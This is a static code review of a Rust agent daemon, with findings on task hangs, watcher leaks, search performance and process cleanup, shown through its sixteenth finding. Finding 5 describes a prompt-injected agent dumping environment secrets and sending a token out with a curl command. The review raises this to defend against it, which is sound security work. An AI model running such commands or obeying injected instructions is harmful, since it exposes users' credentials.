# Static review: Rust daemon core

Scope: `crates/rpc`, `crates/axiomd` (main, socket, app, router, handlers, tools, acp),
`crates/workspace`, `crates/exec`, `crates/store`, `crates/term`, `crates/protocol`, and a brief
look at `crates/desktop-bridge`. Read-only review at `main` (751ffc2), 2026-11-22. Nothing was
built or run, so every finding comes from reading the code. Confidence: **Confirmed** means the
code path shows the defect end to end. **Suspected** means the path exists but whether it
triggers depends on runtime conditions, which are named in the finding.

Priority key: P0 = data loss, security, or a crash of a core flow; P1 = significant defect;
P2 = moderate; P3 = minor.

| # | Title | Pri | Confidence |
|---|-------|-----|------------|
| 1 | Task supervisor waits forever for pipe EOF; cancel cannot interrupt it (hangs `task/cancel`, `workspace/close`, shutdown) | P1 | Confirmed |
| 2 | `agent/send` leaves a session stuck "running" when it fails after `live.begin()` (e.g. a bad `.axiom/project.toml`) | P1 | Confirmed |
| 3 | Git change watch busy-loops and sends `git/didChange` every 300 ms when the `.git` watch can't be created | P1 | Confirmed (path); trigger Suspected |
| 4 | `workspace/search` is quadratic in line length per match and collects unbounded matches per file | P1 | Confirmed |
| 5 | Agent-initiated tasks inherit the daemon's full environment; the secret stripping in security.md does not exist | P1 | Confirmed |
| 6 | Child processes outlive a daemon that is killed or crashes; shutdown also cuts the terminal SIGKILL escalation | P2 | Confirmed (terminal) / Suspected (others) |
| 7 | `fs/watch` is one forwarder per workspace, bound to the first connection; its map entry goes stale; the check-then-insert races | P2 | Confirmed |
| 8 | `workspace/close` is not reference-counted across connections | P2 | Confirmed |
| 9 | `App.clients` is never de-duplicated or pruned; global forwarders `await` each client in turn | P2 | Confirmed (growth) / Suspected (head-of-line) |
| 10 | Blocking work on async worker threads under std mutexes (`git::discover`, recursive watch setup) | P2 | Confirmed |
| 11 | Global MCP/ACP maps (tokio mutexes) are held across process start and handshake | P2 | Confirmed |
| 12 | Session attach is recorded before the request succeeds, so a connection can end up "attached" with no forwarder | P2 | Confirmed |
| 13 | A cancelled or timed-out `preview/start` leaves the preview stuck in `Starting`, and it blocks every later start | P2 | Confirmed |
| 14 | `run_to_end` (agent `task.run`, `build.run`) keeps all task output in memory | P2 | Confirmed |
| 15 | Terminal output has count-based buffers only, with no byte-based backpressure | P2 | Suspected |
| 16 | `std::env::vars()` panics on a non-UTF-8 environment, so terminals, language servers and previews fail | P2 | Confirmed |
| 17 | `ui/verify` build-error buffer stops recording after 500 lines | P2 | Confirmed |
| 18 | ACP terminal approval covers argv only; the agent picks env and cwd afterwards; `outputByteLimit` is unbounded | P2 | Confirmed |
| 19 | Socket accept loop spins on persistent `accept()` errors | P3 | Confirmed |
| 20 | Socket start race can leave a token file that does not match the listener | P3 | Confirmed (race window) |
| 21 | Invalid-Request errors drop an id that can be read | P3 | Confirmed |
| 22 | External `fs/readFile` reads the whole file before its size check; FIFOs block a blocking thread | P3 | Confirmed |
| 23 | A cancel that races a successful `task/start` / `build/run` orphans the task's event forwarder | P3 | Confirmed |
| 24 | Unbounded or stale daemon-lifetime caches (ignore matchers, previews, ACP terminals, dead notifiers) | P3 | Confirmed |
| 25 | Outgoing lines are not bounded by the 64 MiB frame limit | P3 | Suspected |
| 26 | Windows Job Object is assigned after spawn (escape race); terminal close on Windows kills only the shell | P3 | Confirmed (code); Windows deferred |
| 27 | `crates/desktop-bridge` is dead product code that must stay in step with the Dart client | P3 | Confirmed |

Count: P0 0, P1 5, P2 13, P3 9.

---

## 1. Task supervisor waits forever for pipe EOF; cancel cannot interrupt it

- **Category:** Reliability / Concurrency
- **Priority:** P1
- **Confidence:** Confirmed
- **Where:** `crates/exec/src/executor.rs:339-379`, `:214-233`; used from
  `crates/axiomd/src/handlers/workspace.rs:38`, `crates/axiomd/src/router.rs:455`,
  `crates/axiomd/src/tools.rs:350-370`.

```rust
let status = loop { tokio::select! { r = s.child.wait() => break r, _ = s.cancel.notified(), if !cancel_seen => {...} ... } };
// The process is reaped. Let the pipes drain; ...
match grace_deadline {
    Some(d) => { tokio::select! { _ = &mut drain => {}
                                  _ = tokio::time::sleep_until(d) => { lock(&s.tree).kill(); drain.await; } } }
    None => drain.await,
}
```

**What goes wrong.** Once the direct child has exited, nothing waits on `s.cancel` any more.
`drain` then waits without a bound for both reader tasks to reach EOF. A descendant that still
holds the stdout or stderr pipe keeps the task "running" forever. The task never sends
`task/exited`, and `done` never becomes true. Examples of such descendants:
`sh -c 'server & exit 0'`, `adb start-server`, an `npm run dev` that backgrounds a watcher, or
a tool that forks a daemon without closing stdio.

- `task/cancel` (`Executor::cancel`) sets the flag and calls `notify_one()`, but no one is
  listening, so nothing happens.
- In the cancelled path, `kill()` followed by `drain.await` is also unbounded. A descendant
  that left the process group (setsid, or a job-control shell) and holds the pipe still hangs it.
- `Executor::cancel_all` waits on `done` without a bound. This hangs `workspace/close`. The
  shell awaits that close before it opens another folder (`apps/desktop-flutter/lib/state/workspace.dart:152`),
  so the person cannot switch folders.
- The same wait hangs the shutdown hook (`executor.shutdown()`). The daemon then never exits on
  stdin EOF. A daemon the CLI started over stdio stays behind as an orphan.
- In `run_to_end`, the agent's `task.run` timeout fires once and then waits for an `Exited`
  that never arrives, so the tool call hangs.

`crates/exec/tests/exec.rs` has no test where the child exits while a grandchild keeps the
pipe open. `cancel_kills_grandchildren` only covers the case where the shell waits.

**Fix.**
1. Keep listening for cancel during the drain: `select!` on `drain`, `s.cancel.notified()`
   (which kills the tree) and a bounded post-exit drain window, for example 2–3 s after
   `child.wait()` returns. When the window ends, abort the reader tasks and report `Exited`.
2. Bound the drain in the cancelled path the same way, and abort the reader `JoinHandle`s.
3. Optionally, also emit `Exited` once the child is reaped, and let the readers finish in the
   background without blocking `done`.

**Verify.** Add exec tests:
- `exit_with_background_holder_still_reports_exited`: `sh -c 'sleep 30 & exit 0'` produces
  `Exited` within a few seconds.
- `cancel_after_leader_exit_finishes`: `sh -c 'setsid sleep 30 & exit 0'` (holds stdout), then
  `cancel`, then `done` within the grace plus window.
- `cancel_all` returns within a bound for both cases.

---

## 2. `agent/send` leaves a session stuck "running" when it fails after `live.begin()`

- **Category:** Functional / Reliability
- **Priority:** P1
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/handlers/sessions.rs:387-424` (native turn),
  `:512-538` (ACP turn); `crates/agent/src/live.rs:225-247`.

```rust
let Some(cancel) = live.begin() else { return Err(... "A turn is already running") };
let turn = match agent_loop::begin(&live, &input) { Ok(t) => t, Err(e) => { live.end(); return Err(..) } };
...
app.store_call(move |s| s.session_put(&r2)).await?;                 // 412: no live.end()
let root = root.clone().ok_or_else(internal)?;                       // 416
Some((ws.clone(), root, policies(&app, ws).await?))                  // 417: no live.end()
let name = app.workspaces.get(ws)?.name().to_string();               // 423: no live.end()
```

**What goes wrong.** After `begin()` sets `running`, only `live.end()` clears it.
`Live::cancel()` cancels the token but leaves `running` set. Every `?` after line 387 returns
without calling `end()`. If the request is cancelled and aborted after the 100 ms grace
(`rpc/src/server.rs:501-504`) during those awaits, the effect is the same.

A concrete trigger needs no fault in the daemon. `policies()` →
`workspace_policy()` (`handlers/agent.rs:106-118`) returns `invalid_params` when the
workspace's `.axiom/project.toml` has a malformed `[agent.policy]`, or when that file is not
UTF-8 or is over the size limit. Workspace content is untrusted. From then on, until the
daemon restarts:
- every `agent/send` gets `conflict` ("A turn is already running");
- `agent/restore` refuses;
- `SessionInfo.running` stays true.

`agent_loop::begin` has also already journaled the user turn. The ACP path has the same
problem at lines 537-538.

**Fix.** Run everything that can fail (store write, policies, workspace lookup) **before**
`live.begin()`. Otherwise, wrap the token in a guard whose `Drop` calls `live.end()` unless it
is disarmed when the turn task is spawned.

**Verify.** In an `axiomd` integration test, write `.axiom/project.toml` with an invalid
`[agent.policy]`, send a message (expect `invalid_params`), fix the file, and send again. The
second send must run, not return `conflict`. Add a second case that cancels `agent/send` with
`$/cancel` while it waits on a slow store or file read.

---

## 3. Git change watch busy-loops when the `.git` watch can't be created

- **Category:** Performance / Reliability
- **Priority:** P1
- **Confidence:** Confirmed (code path). The trigger is Suspected: it needs `watch_git_dir`
  or `discover` to fail.
- **Where:** `crates/axiomd/src/handlers/git.rs:51-83`.

```rust
let (_keep, mut dir_rx) = match gitdir {
    Some((w, rx)) => (Some(w), rx),
    None => (None, tokio::sync::mpsc::channel(1).1),   // sender dropped at once
};
loop {
    tokio::select! {
        c = tree.changes.recv() => if c.is_none() { return },
        d = dir_rx.recv() => if d.is_none() && _keep.is_some() { return },  // None, _keep None: falls through
    }
    let settle = tokio::time::sleep(DEBOUNCE); ...
    loop { tokio::select! { () = &mut settle => break, _ = tree.changes.recv() => {}, _ = dir_rx.recv() => {} } }
    for c in app.clients_of(&id) { c.notify::<DidChange>(..).await; }
}
```

**What goes wrong.** When `gitdir` is `None`, `dir_rx` is a closed, empty channel, so
`recv()` returns `None` at once on every poll. The outer `select!` never waits, and the inner
settle loop spins until the 300 ms sleep wins. The result:
- one worker thread at 100% CPU (yielding only through tokio's co-op budget);
- a `git/didChange` to every client every 300 ms, forever.

Each `git/didChange` makes the shell call `git/status`, which spawns `git status` (up to 10 s
each), so this also becomes a process-spawning storm.

`gitdir` is `None` when `watch_git_dir` fails. A recursive notify watch on `.git` adds an
inotify watch per directory, so `ENOSPC` (the `max_user_watches` limit) is a realistic cause,
because the workspace watcher has already used watches across the whole tree. `gitdir` is also
`None` when `git::discover` fails transiently, for example on its 10 s timeout in a huge repo.

**Fix.** When there is no git-dir watch, drop that `select!` branch: either wrap `dir_rx` in
an `Option` and use `if let`, or use `std::future::pending()`. In the inner loop, also treat
`tree.changes.recv() == None` as the end. Log the `watch_git_dir` error once.

**Verify.** Make `start_watch` testable with an injected `gitdir = None`, for example by
pointing `GIT_DIR` at something that cannot be watched or by factoring the loop into a
function that takes the receivers. Assert that over 2 s, with no file changes, no
`git/didChange` is sent and the task is pending (not ready).

---

## 4. `workspace/search` is quadratic per match and unbounded per file

- **Category:** Performance
- **Priority:** P1
- **Confidence:** Confirmed
- **Where:** `crates/workspace/src/search.rs:366-407`.

```rust
for (i, line) in text.lines().enumerate() {
    for m in re.find_iter(line) {
        let before: Vec<(usize, char)> = line[..m.start()].char_indices().collect();   // O(line) per match
        ...
        column: utf16_len(&line[..m.start()]) + 1,                                      // O(line) per match
        end_column: utf16_len(&line[..m.end()]) + 1,
```

**What goes wrong.** Each match rescans and allocates the line from its start three times.
A minified bundle (one line up to the 2 MiB cap) searched for a common letter gives about
10⁵–10⁶ matches × 2·10⁶ characters ≈ 10¹¹–10¹² operations. One search thread hangs for
minutes. Cancellation (`cancel` flag) is checked only between files, so `$/cancel` does not
stop it. Search-as-you-type queues more of these searches.

Memory: `ms` collects every match of the file, each with a preview of up to 300 characters,
before the `limit * 2` trim runs, which happens only after the whole file is processed. A
2 MiB file with 2·10⁶ one-character matches allocates about 1 GB, and several walker threads
can do this at once.

**Fix.**
1. Walk the line once: keep a running `(byte_offset, char_index, utf16_index)` cursor that
   moves forward from the previous match.
2. Stop collecting a file's matches once `limit` is reached; set `truncated`.
3. Check `cancel` every N lines.

**Verify.** Add a unit test: a 2 MiB single-line file of `"a"` with query `a` and limit 2000
returns in under 1 s with 2000 matches and `truncated = true`. Add a cancellation test that
sets the flag during that file and expects a return within 100 ms.

---

## 5. Agent-initiated tasks inherit the daemon's full environment

- **Category:** Security
- **Priority:** P1
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/tools.rs:669-724` (`spawn_env`, `task_run`), `:1540-1561`
  (`acp_terminal`), `crates/exec/src/backend.rs:58-63` (no `env_clear`),
  `crates/env/src/project.rs:277-292`. Contradicts `docs/architecture/security.md` §Processes:
  "From M3, variables matching the secret patterns (`*_TOKEN`, `*_KEY`, `*_SECRET`,
  `*PASSWORD*`, plus provider API key names) are stripped from agent-initiated tasks".

```rust
cmd.current_dir(&spec.cwd).envs(&spec.env)  // inherited env + additions; nothing removed
```

**What goes wrong.** `grep` finds no stripping of secret patterns anywhere in `crates/`. A
model steered by prompt injection (file contents and tool output are untrusted data) can run
`task.run ["env"]`, `["printenv","OPENAI_API_KEY"]` or `["sh","-c","curl … -d \"$GITHUB_TOKEN\""]`.
That reads every secret in the daemon's environment: provider keys named by `apiKeyEnv`
(security.md §Model credentials says the daemon reads keys from env), cloud credentials, and
tokens. Approval is per argv, so an `env` call looks harmless on the approval card. Under a
user policy that allows `execute` it is not shown at all. ACP terminals (`acp.terminal`) go
through the same code.

**Fix.** Add a `SpawnSpec.env_remove` (or an `inherit: Filtered` mode) to `axiom-exec`. In
`spawn_env`, for agent principals, strip variables that match the documented patterns and the
configured `apiKeyEnv` names, unless policy allows them explicitly. Keep user-initiated
`task/start` and terminals as they are.

**Verify.** Add an `axiomd/tests/tools.rs` case: start the daemon with
`FOO_TOKEN=s3cret ANTHROPIC_API_KEY=x`, run `task.run ["env"]` through `agent/toolCall`, and
assert that neither value appears in the output while `PATH` and `HOME` are present. Add the
same case for `acp.terminal`.

---

## 6. Child processes outlive a daemon that is killed or crashes; shutdown cuts the terminal SIGKILL escalation

- **Category:** Reliability
- **Priority:** P2
- **Confidence:** Confirmed for the terminal escalation and process-group detachment;
  Suspected for MCP and ACP, which depend on drop order during `shutdown_background`.
- **Where:** `crates/axiomd/src/main.rs:107-117`, `crates/axiomd/src/router.rs:449-456`,
  `crates/term/src/lib.rs:199-222`, `crates/exec/src/backend.rs:63-65`,
  `crates/lsp/src/server.rs:981-983`.

```rust
// router.rs shutdown hook
a.stop_all_watchers(); a.terminals.close_all();
tokio::join!(a.lsp.stop_all(), a.executor.shutdown());
// main.rs
rt.shutdown_background(); std::process::exit(code);
// term: close() sends SIGHUP and spawns a thread that SIGKILLs after 2 s
```

**What goes wrong.**
- **Terminal escalation is cut.** `Terminals::close_all()` sends SIGHUP and starts a 2 s
  escalation thread, then returns at once. The hook finishes, and `std::process::exit` ends
  that thread before it sends SIGKILL. Processes that ignore SIGHUP survive daemon shutdown.
  `close()` also kills only the shell's own process group (`killpg(pid)`). Jobs that an
  interactive shell put in other process groups are not reached by the SIGKILL.
- **Children detach from the daemon.** Every task, language server and terminal runs in its
  own process group or session (`process_group(0)`, PTY `setsid`), and there is no
  `PR_SET_PDEATHSIG` or subreaper. When the shell SIGKILLs a daemon that did not exit in time
  (the 3 s + 2 s budget; see finding 1, where shutdown can hang), or when the daemon crashes
  or is OOM-killed, all of these become orphans: dev servers holding ports, rust-analyzer
  using gigabytes, build processes. `kill_on_drop` does not run on SIGKILL.
- **MCP servers, ACP agents and the git watch are not stopped explicitly.** The hook does not
  stop them. They are killed only if their owning `Child` happens to be dropped during
  `shutdown_background()`, which races `process::exit`, and only if no `Arc<App>` is still
  held, for example by a blocked `spawn_blocking`.

processes.md says running tasks "are killed" on daemon exit, but the code does not guarantee
it.

**Fix.**
1. Make `Terminals::close_all` take a `wait: Duration` and, at shutdown, wait for the
   escalation (or SIGKILL the session's process groups directly after a short wait).
2. In the shutdown hook, clear `agent.mcp` and `agent.acp` and kill their connections
   explicitly, and abort `git_watches`.
3. On Linux, set `PR_SET_PDEATHSIG(SIGKILL)` in a `pre_exec` for exec, LSP and PTY children,
   or make the daemon a subreaper (`PR_SET_CHILD_SUBREAPER`) and kill descendants on exit. On
   macOS, use a watchdog on the parent pipe.

**Verify.**
- An integration test that starts a terminal running `trap '' HUP; sleep 60`, sends
  `shutdown`, waits for the daemon to exit, and asserts the sleep pid is dead within 3 s.
- A test that SIGKILLs the daemon with a running task and asserts the task's pid dies
  (Linux, PDEATHSIG).

---

## 7. `fs/watch` is one forwarder per workspace, bound to the first connection; its entry goes stale

- **Category:** Functional / Concurrency
- **Priority:** P2
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/handlers/fs.rs:233-266`, `crates/axiomd/src/app.rs:285-294`.

```rust
if app.watchers.lock()...contains_key(&p.workspace_id) { return Ok(Empty {}); }   // "idempotent"
let mut handle = ws.watch()?;
let notifier = ctx.notifier.clone();
let task = tokio::spawn(async move { while let Some(changes) = handle.changes.recv().await {
    if notifier.notify::<DidChange>(params).await.is_err() { break; } } });
app.watchers.lock()...insert(p.workspace_id, task.abort_handle());
```

**What goes wrong.**
1. The watcher map is keyed by workspace, not by connection. If a second connection (another
   window, the CLI or MCP front end over the socket) enables `fs/watch`, it gets `Ok` and
   never receives an event. processes.md §Multi-client says events go to every connection
   that subscribed.
2. When the first connection closes, its forwarder ends (`notify` fails), but the map entry
   stays. Every later `fs/watch enabled:true` gets `Ok` and receives nothing until
   `workspace/close`.
3. The check (line 240) and the insert (line 262) happen under separate lock acquisitions.
   Two concurrent enables both create forwarders, and the second insert overwrites the first
   `AbortHandle`. The first forwarder leaks, and `fs/watch enabled:false` can no longer stop
   it, so the client gets duplicate `fs/didChange` events.

**Fix.** Key watchers by `(WorkspaceId, connection)`, for example a `Vec<(Notifier, AbortHandle)>`
per workspace de-duplicated with `same_connection`. Remove the entry when the forwarder exits.
Do the check and insert under one lock (reserve the slot first).

**Verify.** Add an axiomd test with two clients on the socket: both enable watch, a file
changes, and each receives exactly one `fs/didChange`. Close client A; client B still
receives events, and a re-enable from a new client C receives events.

---

## 8. `workspace/close` is not reference-counted across connections

- **Category:** Architecture / Functional
- **Priority:** P2
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/handlers/workspace.rs:36-53`,
  `crates/workspace/src/registry.rs:70-79`. Contradicts `docs/architecture/processes.md`
  §Multi-client: "Workspace handles are reference-counted across connections."

```rust
app.executor.cancel_all(&p.workspace_id).await; app.stop_watcher(..); app.lsp.close_workspace(..).await;
app.terminals.close_workspace(..); ... app.clients...remove(&p.workspace_id); app.workspaces.close(..).await?;
```

**What goes wrong.** `workspace/open` is idempotent per canonical root and returns the same id
to every connection. Any one connection's `workspace/close` then does all of the following for
everyone:
- cancels every task of the workspace (including a CLI `axiom build` or an MCP client's
  `task.run`);
- stops LSP servers and terminals;
- drops every client's notifier;
- removes the id, so other connections' later calls fail with `workspace_not_open`.

The shell closes the old workspace whenever the person switches folders
(`state/workspace.dart:146-153`). Any CLI or MCP client working in that folder at the time
loses its work.

**Fix.** Keep a per-connection open count, for example a `HashMap<WorkspaceId, Vec<Notifier>>`
de-duplicated per connection, which also fixes finding 9. On close, remove only the caller.
Tear down only when the last holder closes or disconnects (a disconnect hook for socket
connections).

**Verify.** A socket test: client A and client B open the same folder, B starts
`sleep 30` with `task/start`, and A closes. B's task is still running and B's `fs/list`
succeeds. When B then closes, everything is torn down.

---

## 9. `App.clients` is never de-duplicated or pruned; forwarders `await` each client in turn

- **Category:** Reliability / Performance
- **Priority:** P2
- **Confidence:** Confirmed (growth); Suspected (head-of-line blocking)
- **Where:** `crates/axiomd/src/app.rs:28-30, 239-256`; senders at `handlers/terminal.rs:96-108`,
  `handlers/lsp.rs:308-339`, `handlers/git.rs:76-81`, `handlers/preview.rs:247-254`,
  `handlers/ui.rs:148-186`, `tools.rs:990`.

```rust
/// ... Closed connections are dropped on the next send.        // not true: nothing prunes
pub fn add_client(&self, ws: &WorkspaceId, n: Notifier) { ...entry(ws.clone()).or_default().push(n); }
pub fn clients_of(&self, ws: &WorkspaceId) -> Vec<Notifier> { ...get(ws).cloned()... }
// terminal forwarder (one task for all terminals of all workspaces):
for c in app.clients_of(&workspace_id) { let _ = c.notify::<Output>(n.clone()).await; }
```

**What goes wrong.**
- **Duplicates.** Every `workspace/open` pushes a notifier, even from a connection that
  already has one, so a connection that opens the same folder twice gets every terminal
  output, diagnostic and preview notification twice.
- **Dead notifiers.** Notifiers of closed connections are kept until `workspace/close`, and
  the CLI never closes (`apps/cli/src/main.rs:118-124`). Each CLI invocation adds one per
  workspace for the daemon's life.
- **Head-of-line blocking.** The terminal, LSP, preview and inspection forwarders are single
  daemon-wide tasks that `await` each client's bounded queue in turn. One connection whose
  queue (1024) is full, for example a socket client that stops reading, blocks terminal and
  LSP traffic for every workspace and every other client. The broadcast receivers then lag
  and drop terminal output.

**Fix.**
- De-duplicate in `add_client` (`same_connection`) and `retain(!is_closed)` in `clients_of`.
- Have the forwarders send with a per-client timeout, or give each client its own forwarder
  task with its own bounded queue, so one slow peer does not stall the others.

**Verify.**
- A unit test on `App`: two `add_client` calls with the same notifier give `clients_of().len() == 1`;
  a closed notifier is pruned.
- An integration test: open the same workspace twice on one connection, write to a terminal,
  and receive exactly one `terminal/output` per seq.

---

## 10. Blocking work on async worker threads under std mutexes

- **Category:** Performance / Concurrency
- **Priority:** P2
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/handlers/git.rs:15-24, 41-52`; `crates/axiomd/src/handlers/fs.rs:248`;
  `crates/workspace/src/watch.rs:63-72, 91-99`; `crates/workspace/src/git.rs:96-137`.

```rust
pub async fn status(..) { ... if st.repo { start_watch(&app, &p.workspace_id); } }     // async context
fn start_watch(..) { let mut watches = app.git_watches.lock()...;                       // std mutex held
    let Ok(mut tree) = w.watch() else { return };             // recursive inotify add of the whole tree
    let repo = git::discover(&root).ok();                     // spawns git, polls with thread::sleep up to 10 s
    let gitdir = repo.and_then(|r| git::watch_git_dir(&r.git_dir).ok()); ...
```

**What goes wrong.**
- `git/status` runs `git rev-parse` synchronously on a Tokio worker. The run is a
  `try_wait` + `thread::sleep(5ms)` loop for up to 10 s, and it holds the `git_watches` std
  mutex the whole time.
- `Workspace::watch()` runs notify's recursive setup, which walks every directory including
  ignored ones such as `node_modules` and `target`, on the async thread and under
  `inner.watch`. This happens both from `fs/watch` and from `start_watch`.
- In large repositories this blocks a runtime worker for seconds. A failed `w.watch()` (for
  example `ENOSPC`) returns without recording anything, so every later `git/status` repeats
  the full walk.

The recursive OS watch also covers ignored trees, which uses up inotify watches. The `.git`
directory is watched twice, by the tree watcher and by `watch_git_dir`.

**Fix.**
1. Move `start_watch`'s `w.watch()`, `discover` and `watch_git_dir` into `spawn_blocking`, and
   take the mutex only to insert the result (with a "starting" marker to avoid duplicates).
2. Do the same for `ws.watch()` in `fs::watch`.
3. Remember a failure for a while instead of retrying on every status.
4. Consider non-recursive watches that skip ignored directories.

**Verify.** Run a Tokio test with `flavor = "current_thread"`: start `git/status` on a fixture
with a deep tree while another task ticks every 10 ms, and assert the ticker is never delayed
by more than 100 ms.

---

## 11. Global MCP/ACP maps are held across process start and handshake

- **Category:** Concurrency / Performance
- **Priority:** P2
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/handlers/sessions.rs:543-566` (ACP), `:656-671` (MCP), `:241-243` (delete).

```rust
let mut m = a.agent.acp.lock().await;          // daemon-wide tokio Mutex
match m.get(&live.id) { None => { ... axiom_agent::acp::connect(&config, &root, ...).await ... } }
...
let mut running = app.agent.mcp.lock().await;  // daemon-wide
for cfg in &configs { ... McpClient::start(cfg, root).await ... }
```

**What goes wrong.** Starting an external agent or MCP server, for example `npx …`, can take
tens of seconds: package download, JVM start, the initialize handshake. During that time the
*daemon-wide* map lock is held. Turns in every other session that need an ACP connection or
MCP tools wait behind it, and `agent/sessionDelete` (which locks both maps) blocks. A server
that never answers its handshake blocks all of them indefinitely, unless the agent crate puts
a timeout on `connect` or `start`, which this layer does not.

**Fix.** Use per-session slots: put a `tokio::sync::OnceCell<Arc<…>>`, or a per-session
`Mutex`, into the map under a short lock, release the map lock, and then initialize the slot.
`sessionDelete` takes the slot out without waiting for an initialization that is in progress.

**Verify.** An integration test with two sessions, where session A's MCP server is a script
that sleeps 30 s before answering. Session B's turn, with no MCP servers or a fast one, must
start within 1 s, and `agent/sessionDelete` of A must return promptly.

---

## 12. Session attach is recorded before the request succeeds

- **Category:** Functional
- **Priority:** P2
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/handlers/sessions.rs:116-147, 188, 211, 345`;
  `crates/rpc/src/server.rs:482-499` (after-futures run only on `Ok`, not on cancel).

```rust
fn attach(..) {
    { let mut a = app.agent.attached.lock()...; a.retain(|(_, n)| !n.is_closed());
      if a.iter().any(|(s, n)| *s == live.id && n.same_connection(&notifier)) { return; }
      a.push((live.id.clone(), notifier.clone())); }          // recorded now
    let mut rx = live.subscribe();
    ctx.after_response(async move { loop { ... notify::<Event> ... } });   // runs only if the request returns Ok
}
```

**What goes wrong.** `send` calls `attach` (line 345) before it validates `from_turn`, the
provider, attachments and images, and before `live.begin()` (`conflict`). If any of those
fail, or if `agent/sessionOpen` or `agent/send` is cancelled with `$/cancel` after `attach`,
the router drops the after-futures but the `(session, connection)` entry stays. Every later
`sessionOpen` or `send` from that connection takes the early return, so the connection never
receives that session's live events (streaming text, tool cards, approvals) again while it
lives.

The same happens when the forwarder ends with `RecvError::Closed`: the entry is not removed.

**Fix.** Record the attachment inside the after-future, when it starts. Remove it when the
forwarder exits. Alternatively, keep a token in the entry and replace the entry when no live
forwarder exists.

**Verify.** An integration test: `agent/send` with an unknown `fromTurn` returns
`invalid_params`. Then `agent/sessionOpen` and a valid `agent/send` on the same connection.
Expect `agent/event` notifications for the turn.

---

## 13. A cancelled or timed-out `preview/start` leaves the preview stuck in `Starting`

- **Category:** Functional / Reliability
- **Priority:** P2
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/handlers/preview.rs:117-125, 214-215, 287-317`.

```rust
if let Some(running) = app.previews.of_workspace(..).into_iter()
    .find(|i| matches!(i.state, PreviewState::Ready | PreviewState::Starting)) { return Ok(running); }
...
app.previews.insert(info.clone());                       // state Starting
let outcome = tokio::time::timeout(URL_WAIT, url_rx).await;   // up to 60 s inside the request
match outcome { Ok(Ok(Ok(url))) => { app.previews.update(&id, |i| { i.state = Ready; ... }) } ... }
```

**What goes wrong.** The move from `Starting` to `Ready` happens only in the request handler.
If the client cancels the request (`$/cancel`), or its own request timeout fires and it
cancels, during the up-to-60 s wait, the router aborts the handler after 100 ms. The dev
server task and its relay keep running. The relay sends the URL into a dropped oneshot, so
the preview stays `Starting` forever. Every later `preview/start` for the workspace returns
that stuck preview because of the "one preview per workspace" check, and there is no way to
get a URL other than `preview/stop`.

The check (line 120) and the insert (line 214) are also separated by awaits, so a
double-clicked start launches two dev servers.

**Fix.** Do the `Starting` → `Ready` update in the detached relay task (it already sees the
URL). Have the handler only wait on a watch of the preview's state. Insert a placeholder
under the same lock as the check.

**Verify.** An integration test with a fake dev server that prints its URL after 2 s: start,
`$/cancel` after 200 ms, wait 3 s, `preview/list` shows `ready` with the URL. Two concurrent
starts give the same `previewId`.

---

## 14. `run_to_end` keeps all task output in memory

- **Category:** Performance / Reliability
- **Priority:** P2
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/tools.rs:335-392` (used by `task.run` and `build.run`).

```rust
let mut out = String::new();
... TaskEvent::Output(o) => { if o.stream == Stream::Stderr || o.stream == Stream::Stdout { out.push_str(&o.data); } }
let (t, cut) = tail(&out);                       // only the last 200 lines / 16 KiB are used
```

**What goes wrong.** An agent running `cat` on a large log, or a verbose test suite, makes the
daemon hold the whole output for the duration of the call, possibly hundreds of MB to GB, even
though only a 16 KiB tail is kept. `tail()` then also builds a `Vec<&str>` of every line.

**Fix.** Keep a bounded ring: a `VecDeque` of lines capped at `TAIL_LINES`, or a byte ring of
about 64 KiB. Return the full output only to callers that need it, with a cap.

**Verify.** A unit or integration test: `task.run ["sh","-c","yes | head -c 200000000"]`
completes, and the daemon's RSS growth stays under about 50 MB (or assert the internal buffer
never exceeds the cap through a test hook).

---

## 15. Terminal output has no byte-based backpressure

- **Category:** Performance / Reliability
- **Priority:** P2
- **Confidence:** Suspected (depends on the PTY producing output faster than the shell consumes it)
- **Where:** `crates/term/src/lib.rs:377-436`, `:237` (broadcast 4096);
  `crates/axiomd/src/handlers/terminal.rs:66-112`; `crates/rpc/src/router.rs:13` (queue 1024).

```rust
let (tx, rx) = sync_channel::<Vec<u8>>(64);            // reader -> coalescer: bounded
... pending.push_str(&decoder.push(&bytes));          // pending grows without limit within 16 ms
let _ = events.send(TermEvent::Output { .. data });   // broadcast: never blocks, 4096 slots
```

**What goes wrong.** The coalescer never blocks: `broadcast::send` always succeeds. So
`yes`, or `cat` of a large file, in a terminal runs at full PTY speed (around 100 MB/s or
more). Every queue is bounded by count, not bytes:
- each 16 ms event can be megabytes;
- the broadcast ring keeps up to 4096 such events while the forwarder is slow;
- each connection queue holds up to 1024 of them, JSON-escaped.

With a shell that renders more slowly than the PTY produces, the daemon's memory can reach
gigabytes. Once the forwarder lags, output is dropped (`Lagged`).

**Fix.** Cap `pending` (for example 256 KiB per event) and block the coalescer, so that the
backpressure reaches the PTY reader and then the program, when unsent bytes per terminal
exceed a budget. That needs a per-terminal byte budget released by the forwarder, or a
bounded mpsc per terminal instead of the broadcast. The 1 MiB backlog stays the source of
truth for redraw.

**Verify.** A term crate test: create a terminal running `yes`, do not drain the subscriber
for 2 s, and assert that the bytes held (in events plus pending) stay under the budget and
that the child is blocked in write (CPU near zero).

---

## 16. `std::env::vars()` panics on a non-UTF-8 environment

- **Category:** Reliability (panic reachable in a core flow)
- **Priority:** P2
- **Confidence:** Confirmed (code); the trigger needs a non-UTF-8 variable in the daemon's environment.
- **Where:** `crates/axiomd/src/handlers/env.rs:71`. Callers: `terminal.rs:18`, `lsp.rs:95`,
  `preview.rs:186`.

```rust
let mut env: std::collections::BTreeMap<String, String> = std::env::vars().collect();
```

**What goes wrong.** `std::env::vars()` panics during iteration if any key or value is not
valid Unicode. On Unix the desktop session's environment can hold such bytes, for example a
path in a legacy encoding. The handler task panics, and the RPC supervisor maps that to
`internal`. Then every `terminal/create`, every language-server launch, and every
`preview/start` fails, for the life of the daemon and with no useful message.

**Fix.** Use `std::env::vars_os()` and skip, or lossily convert, entries that are not UTF-8.
Better, carry `OsString` through `Spec.env` and `SpawnSpec.env`.

**Verify.** A unit test of `process_environment`'s env building with an injected
`vars_os()` source containing `OsString::from_vec(b"\xff".to_vec())`: it must not panic, and
